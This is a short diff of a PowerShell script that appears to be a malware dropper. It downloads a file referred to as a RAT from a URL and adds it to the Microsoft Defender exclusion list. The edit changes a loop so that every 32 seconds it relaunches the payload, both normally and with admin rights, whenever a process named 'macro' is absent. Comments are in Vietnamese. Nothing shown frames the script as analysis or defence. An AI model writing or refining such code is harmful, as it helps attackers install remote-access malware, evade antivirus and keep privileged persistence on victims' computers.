@@ -11,6 +11,9 @@ Invoke-WebRequest -Uri $ratUrl -OutFile $ratPath
 Add-MpPreference -ExclusionProcess $ratPath
 
 while ($true) {
-    Start-Process -FilePath $ratPath -Verb RunAs
+    if (-not (Get-Process -Name "macro" -ErrorAction SilentlyContinue)) {
+        Start-Process -FilePath $ratPath   # Chạy bình thường
+        Start-Process -FilePath $ratPath -Verb RunAs  # Chạy với quyền admin
+    }
     Start-Sleep -Seconds 32
 }
